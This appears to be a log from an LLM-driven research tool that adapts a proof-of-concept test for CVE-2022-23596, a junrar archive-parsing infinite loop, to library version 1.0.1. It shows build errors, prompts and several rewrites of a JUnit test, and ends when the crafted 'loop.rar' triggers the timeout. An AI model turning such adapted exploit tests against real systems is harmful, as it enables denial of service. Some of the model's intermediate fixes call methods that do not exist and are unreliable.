[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable Junrar[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1360 (prompt), 1 (completion), 1361 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 1.0.1:com.github.junrar:junrar.
This test file compiles and runs successfully with version 2.0.0.

Your task is to:
1. Analyze why this issue occurs with the *2.0.0* but not with the *1.0.1 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
  symbol:   variable Junrar
  location: class edu.vision.se.Testcase1
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.895 s
[INFO] Finished at: 2025-07-13T14:16:51Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
[ERROR]   symbol:   variable Junrar
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] 
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <groupId>edu.vision.se</groupId><version>1.0-SNAPSHOT</version><modelVersion>4.0.0</modelVersion>
  <artifactId>CVE-2022-23596</artifactId>
  <name>junrar CVE-2022-23596</name>

  <properties>
    <maven.compiler.target>11</maven.compiler.target>
    <maven.compiler.source>11</maven.compiler.source>
  </properties>

  <dependencies>
    <dependency>
      <groupId>com.github.junrar</groupId>
      <artifactId>junrar</artifactId>
      <version>1.0.1</version>
    </dependency>
    <dependency>
        <groupId>cn.hutool</groupId>
        <artifactId>hutool-all</artifactId>
        <version>5.7.10</version>
    </dependency>
  <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
  
  </dependencies>
</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 137 (prompt), 6 (completion), 143 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 1.0.1: 

Error: cannot find symbol, variable Junrar, class edu.vision.se.Testcase1 

The test executes as expected in 2.0.0 

Error code:             Junrar.extract(file, destFile); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
Junrar;Testcase1
[96m[ErrorManager] Extracted key entities: ['Junrar', 'Testcase1'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 19, 'column': 13, 'message': 'cannot find symbol', 'symbol': 'variable Junrar', 'location': 'class edu.vision.se.Testcase1', 'code_line': '            Junrar.extract(file, destFile);'} with cause: ['Junrar', 'Testcase1'][0m
[96m[Adapter] Related diffs for error: [(37, 4.0), (0, 0.0), (1, 0.0), (2, 0.0), (3, 0.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | variable Junrar cause: ['Junrar', 'Testcase1'][0m
[96m[RepairModule] Trying best diff #37 with score 4.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #(37, 3) with score 2.00[0m
[LLMClient] Tokens used: 659 (prompt), 206 (completion), 865 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 1.0.1:com.github.junrar:junrar.
This test file compiles and runs successfully in 2.0.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 2.0.0 to 1.0.1.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: variable Junrar, location: class edu.vision.se.Testcase1

### Error Position:
            Junrar.extract(file, destFile);

### Related Diff:
Operation: MODIFIED, File: src/main/java/com/github/junrar/extract/ExtractArchive.java, Hunk: @@ -1,15 +1,10 @@
 package com.github.junrar.extract;

 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.OutputStream;

+import org.apache.commons.logging.Log;
+
+import com.github.junrar.Archive;
-import com.github.junrar.Junrar;
 import com.github.junrar.exception.RarException;
+import com.github.junrar.rarfile.FileHeader;

 /**
  * extract an archive to the given location
Operation: MODIFIED, File: src/main/java/com/github/junrar/Archive.java, Hunk: @@ -35,6 +36,7 @@
 import com.github.junrar.exception.RarException;
 import com.github.junrar.exception.RarException.RarExceptionType;
 import com.github.junrar.impl.FileVolumeManager;
-import com.github.junrar.impl.InputStreamVolumeManager;
 import com.github.junrar.io.IReadOnlyAccess;
 import com.github.junrar.rarfile.AVHeader;
 import com.github.junrar.rarfile.BaseBlock;

### Test File Content:
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Archive;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            Junrar.extract(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}


[LLMClient] Response: 
Here's the modified test file according to the diff:

```java
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Archive;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            new Archive(file).extractTo(destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,30] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method extractTo(java.io.File)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class com.github.junrar.Archive[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'cannot find symbol | variable Junrar'}
[RepairModule] New grouped keys: {'cannot find symbol | method extractTo(java.io.File)'}
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 19, Column: 30
  Message  : cannot find symbol
  Symbol   : method extractTo(java.io.File)
  Location : class com.github.junrar.Archive
  Code     : new Archive(file).extractTo(destFile);
  Position : same the fixing line (19)[0m
[92m[RepairModule] Error cannot find symbol resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #(37, 3) at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,30] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   method extractTo(java.io.File)[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class com.github.junrar.Archive[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1368 (prompt), 1 (completion), 1369 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 1.0.1:com.github.junrar:junrar.
This test file compiles and runs successfully with version 2.0.0.

Your task is to:
1. Analyze why this issue occurs with the *2.0.0* but not with the *1.0.1 version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,30] cannot find symbol
  symbol:   method extractTo(java.io.File)
  location: class com.github.junrar.Archive
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.051 s
[INFO] Finished at: 2025-07-13T14:17:16Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,30] cannot find symbol
[ERROR]   symbol:   method extractTo(java.io.File)
[ERROR]   location: class com.github.junrar.Archive
[ERROR] 
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <groupId>edu.vision.se</groupId><version>1.0-SNAPSHOT</version><modelVersion>4.0.0</modelVersion>
  <artifactId>CVE-2022-23596</artifactId>
  <name>junrar CVE-2022-23596</name>

  <properties>
    <maven.compiler.target>11</maven.compiler.target>
    <maven.compiler.source>11</maven.compiler.source>
  </properties>

  <dependencies>
    <dependency>
      <groupId>com.github.junrar</groupId>
      <artifactId>junrar</artifactId>
      <version>1.0.1</version>
    </dependency>
    <dependency>
        <groupId>cn.hutool</groupId>
        <artifactId>hutool-all</artifactId>
        <version>5.7.10</version>
    </dependency>
  <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
  
  </dependencies>
</project>
[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[LLMClient] Tokens used: 143 (prompt), 11 (completion), 154 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 1.0.1: 

Error: cannot find symbol, method extractTo(java.io.File), class com.github.junrar.Archive 

The test executes as expected in 2.0.0 

Error code:             new Archive(file).extractTo(destFile); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
com.github.junrar.Archive;extractTo
[96m[ErrorManager] Extracted key entities: ['com.github.junrar.Archive', 'extractTo'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 19, 'column': 30, 'message': 'cannot find symbol', 'symbol': 'method extractTo(java.io.File)', 'location': 'class com.github.junrar.Archive', 'code_line': '            new Archive(file).extractTo(destFile);'} with cause: ['com.github.junrar.Archive', 'extractTo'][0m
[LLMClient] Tokens used: 171 (prompt), 11 (completion), 182 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 1.0.1: 

Error: cannot find symbol, method extractTo(java.io.File), class com.github.junrar.Archive 

The test executes as expected in 2.0.0 

Error code:             new Archive(file).extractTo(destFile); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['com.github.junrar.Archive', 'extractTo'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
com.github.junrar.Archive;extractTo
[96m[ErrorManager] Extracted key entities: ['com.github.junrar.Archive', 'extractTo'][0m
[96m[Adapter] Related diffs for error: [(0, 1.0), (68, 1.0), (1, 0.0), (2, 0.0), (3, 0.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: cannot find symbol | method extractTo(java.io.File) cause: ['com.github.junrar.Archive', 'extractTo'][0m
[96m[RepairModule] Trying best diff #0 with score 1.00[0m
[96m[RepairModule] Found 10 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #(0, 68) with score 1.00[0m
[LLMClient] Tokens used: 640 (prompt), 217 (completion), 857 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 1.0.1:com.github.junrar:junrar.
This test file compiles and runs successfully in 2.0.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 2.0.0 to 1.0.1.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: cannot find symbol, symble: method extractTo(java.io.File), location: class com.github.junrar.Archive

### Error Position:
            new Archive(file).extractTo(destFile);

### Related Diff:
Operation: MODIFIED, File: pom.xml, Hunk: @@ -3,7 +3,7 @@
 	<groupId>com.github.junrar</groupId>
 	<artifactId>junrar</artifactId>
 	<packaging>jar</packaging>
+	<version>1.0.1</version>
-	<version>2.0.0</version>
 	<name>Java UnRar</name>
 	<description>rar decompression library in plain java</description>
 	<url>https://github.com/junrar/junrar</url>
Operation: MODIFIED, File: src/main/java/com/github/junrar/testutil/ExtractArchive.java, Hunk: @@ -1,10 +1,9 @@
 package com.github.junrar.testutil;

+import java.io.File;
 import java.io.IOException;

-import com.github.junrar.Junrar;
 import com.github.junrar.exception.RarException;
+import org.apache.commons.logging.LogFactory;

 /**
  * extract an archive to the given location

### Test File Content:
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Archive;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            new Archive(file).extractTo(destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}



[LLMClient] Response: 
Here's the modified version of the test file according to the diff:

```java
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Archive;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;
import com.github.junrar.Junrar;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            Junrar.extract(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure:[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[8,25] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   class Junrar[0m
[92m[ErrorManager] Processing line: [ERROR]   location: package com.github.junrar[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[20,13] cannot find symbol[0m
[92m[ErrorManager] Processing line: [ERROR]   symbol:   variable Junrar[0m
[92m[ErrorManager] Processing line: [ERROR]   location: class edu.vision.se.Testcase1[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'cannot find symbol | method extractTo(java.io.File)'}
[RepairModule] New grouped keys: {'cannot find symbol | class Junrar', 'cannot find symbol | variable Junrar'}
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 8, Column: 25
  Message  : cannot find symbol
  Symbol   : class Junrar
  Location : package com.github.junrar
  Code     : import com.github.junrar.Junrar;
  Position : before the fixing line (19)[0m
[93m[RepairModule] [Analyzer] New error introduced before the fixing line, might be caused by the diff.[0m
[96m[RepairModule] Simple repair for error: {'file': '/PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 8, 'column': 25, 'message': 'cannot find symbol', 'symbol': 'class Junrar', 'location': 'package com.github.junrar', 'code_line': 'import com.github.junrar.Junrar;'}[0m
[96m[RepairModule] Group : [{'file': '/PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 8, 'column': 25, 'message': 'cannot find symbol', 'symbol': 'class Junrar', 'location': 'package com.github.junrar', 'code_line': 'import com.github.junrar.Junrar;'}][0m
[96m[RepairModule] Group key : cannot find symbol | class Junrar[0m
[LLMClient] Tokens used: 135 (prompt), 11 (completion), 146 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 1.0.1: 

Error: cannot find symbol, class Junrar, package com.github.junrar 

The test executes as expected in 2.0.0 

Error code: import com.github.junrar.Junrar; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
com.github.junrar.Junrar;Junrar
[96m[ErrorManager] Extracted key entities: ['com.github.junrar.Junrar', 'Junrar'][0m
[96m[RepairModule] Extracted cause: ['com.github.junrar.Junrar', 'Junrar'][0m
[96m[RepairModule] Related diffs for simple repair: [(37, 8.0), (0, 0.0), (1, 0.0), (2, 0.0), (3, 0.0)][0m
[96m[RepairModule] Trying diff #37 with score 8.00 for simple repair[0m
[LLMClient] Tokens used: 521 (prompt), 212 (completion), 733 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 1.0.1:com.github.junrar:junrar.
This test file compiles and runs successfully in 2.0.0.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 2.0.0 to 1.0.1.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. If mocking, access fields via reflection if they exist.

Only output the modified version of the test file. No explanations. 
### Compilation Errors:
cannot find symbol in import com.github.junrar.Junrar;### Related Diff:
Operation: MODIFIED, File: src/main/java/com/github/junrar/extract/ExtractArchive.java, Hunk: @@ -1,15 +1,10 @@
 package com.github.junrar.extract;

 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.OutputStream;

+import org.apache.commons.logging.Log;
+
+import com.github.junrar.Archive;
-import com.github.junrar.Junrar;
 import com.github.junrar.exception.RarException;
+import com.github.junrar.rarfile.FileHeader;

 /**
  * extract an archive to the given location

### Test File Content:
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Archive;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;
import com.github.junrar.Junrar;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            Junrar.extract(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}



[LLMClient] Response: 
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Archive;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;
import com.github.junrar.extract.ExtractArchive;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            ExtractArchive extractArchive = new ExtractArchive();
            extractArchive.extractArchive(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
